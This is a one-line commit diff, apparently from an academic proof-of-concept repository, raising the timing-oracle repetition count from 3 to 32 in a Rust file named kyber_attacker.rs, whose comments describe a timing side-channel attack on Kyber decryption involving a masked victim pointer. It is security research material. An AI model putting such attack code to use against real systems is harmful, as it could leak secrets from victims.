efb696097e85fe25bb137fa3711a430423d926f5
Denis Nabokov <denis.nabokov@eit.lth.se>
2025-07-23 17:04:06 +0200

    increase repetitions

--- poc/crypto_attacker/examples/kyber_attacker.rs
+++ poc/crypto_attacker/examples/kyber_attacker.rs
@@ -462,7 +462,7 @@ fn kyber_hacker(
 
     // instead of creating a ciphertext here, we rely on a smart process that will submit us
     // with them, we just need to measure the timing, i.e. we are implementing an oracle here
-    let oracle_repetitions: u16 = 3;
+    let oracle_repetitions: u16 = 32;
 
     // Send random mask and masked pointer so that constructed ciphertext is decrypted into
     // message containing victim pointer
